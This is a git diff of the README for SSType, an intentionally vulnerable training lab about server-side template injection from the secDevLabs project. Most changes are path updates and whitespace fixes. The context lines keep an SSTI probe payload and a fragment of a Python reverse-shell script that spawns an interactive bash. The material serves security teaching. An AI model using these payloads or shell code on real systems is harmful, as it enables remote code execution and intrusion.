@@ -1,4 +1,3 @@
-
 # SSType
 
 <p align="center"><img  src="src/images/ssti-logo.png"/></p>
@@ -22,23 +21,23 @@ The main goal of this project is to discuss how **Server-Side Template Injection
 
 ## Setup
 
-To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
+To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
 ```sh
-cd secDevLabs/owasp-top10-2017-apps/a1/sstype
+cd secDevLabs/owasp-top10-2021-apps/a3/sstype
 ```
 
 ```sh
 make install
 ```
 
-Then simply visit [localhost:10001][App], as exemplified below:
+Then simply visit [localhost:10001][app], as exemplified below:
 
 <p align="center"><img  src="images/SSType.jpg"/></p>
 
 ## Get to know the app 💉
 
-To properly understand how this application works, you can do some search using `name` as a query string using a [browser](http://localhost:10001/?name=Vitor) or using `curl` in a terminal: 
+To properly understand how this application works, you can do some search using `name` as a query string using a [browser](http://localhost:10001/?name=Vitor) or using `curl` in a terminal:
 
 ```sh
 curl http://localhost:10001/?name=Vitor
@@ -75,10 +74,10 @@ To confirm that the input field is vulnerable, the following payload could be us
 http://localhost:10001/?name={{4*4}}
 ```
 
-When this request gets to the application, `NAMEHERE` will be replaced into the HTML and it will execute the math, returning `16`: 
+When this request gets to the application, `NAMEHERE` will be replaced into the HTML and it will execute the math, returning `16`:
 
 ```html
-<h3>Hello: {{4*4}} </h3>
+<h3>Hello: {{4*4}}</h3>
 <h2>Try with /?name=YourName</h2>
 ```
 
@@ -108,7 +107,7 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 
-# spawns an interactive sh shell  
+# spawns an interactive sh shell
 p=subprocess.call(["/bin/bash","-i"]);
 ```
 
@@ -148,6 +147,6 @@ How could you now mitigate this vulnerability? After your code modification, an 
 
 We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
-[Docker Install]:  https://docs.docker.com/install/
-[Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost:10001
+[docker install]: https://docs.docker.com/install/
+[docker compose install]: https://docs.docker.com/compose/install/
+[app]: http://localhost:10001
